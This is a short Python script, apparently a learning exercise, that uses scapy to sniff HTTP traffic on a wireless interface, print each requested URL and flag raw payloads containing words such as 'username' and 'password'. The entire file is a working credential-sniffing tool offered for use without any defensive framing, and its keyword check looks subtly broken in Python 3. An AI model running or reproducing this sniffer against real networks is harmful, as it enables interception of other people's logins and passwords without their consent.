#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store=False, prn=sniff_packet)

    # iface - interface(wlan0,eth0)
    # store - memory
    # prn - after get packet use a function

def sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print('[+] HTTP request >>' + url.decode() + '\n')

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].summary()

            keywords = ['username' , 'user', 'login', 'password', 'pass']

            for i in keywords:
                if i in load:
                    print('\n\n[+] Possible username >' + load.decode())
                    break

sniff('wlan0')
